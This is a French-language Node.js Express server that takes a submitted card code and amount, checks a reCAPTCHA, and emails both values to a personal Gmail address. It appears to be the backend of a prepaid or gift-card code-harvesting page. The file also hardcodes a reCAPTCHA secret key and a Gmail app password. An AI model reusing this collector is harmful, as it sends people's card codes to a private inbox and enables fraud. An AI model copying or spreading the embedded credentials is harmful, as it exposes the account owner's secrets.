const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/envoyer-code', async (req, res) => {
  const { numeroCarte, codeSecurite, 'g-recaptcha-response': captcha } = req.body;

  // Vérification des champs
  if (!/^\d{1,16}$/.test(numeroCarte)) {
    return res.status(400).send("Code de carte invalide");
  }

  if (!/^\d+(\.\d{1,2})?$/.test(codeSecurite)) {
    return res.status(400).send("Montant invalide");
  }

  // Vérification CAPTCHA
  if (!captcha) {
    return res.status(400).send("Veuillez valider le Captcha.");
  }

  try {
    const secretKey = '6Lc49B8rAAAAAED5fyYu7EA57NFm3kcOM9jKZktT';
    const response = await axios.post(
      `https://www.google.com/recaptcha/api/siteverify?secret=${secretKey}&response=${captcha}`
    );

    if (!response.data.success) {
      return res.status(400).send("Échec de la vérification Captcha.");
    }

    // Envoi du mail
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'wanarnaud@gmail.com',
        pass: 'gyauzfvkgauczwhj',
      }
    });

    const mailOptions = {
      from: 'wanarnaud@gmail.com',
      to: 'wanarnaud@gmail.com',
      subject: 'Code de carte reçu',
      text: `Code: ${numeroCarte}\nMontant: ${codeSecurite}`
    };

    await transporter.sendMail(mailOptions);
    res.send("Code envoyé avec succès !");
  } catch (error) {
    console.error("Erreur d'envoi:", error);
    res.status(500).send("Une erreur est survenue.");
  }
});

app.listen(PORT, () => {
  console.log(`Serveur lancé sur http://localhost:${PORT}`);
});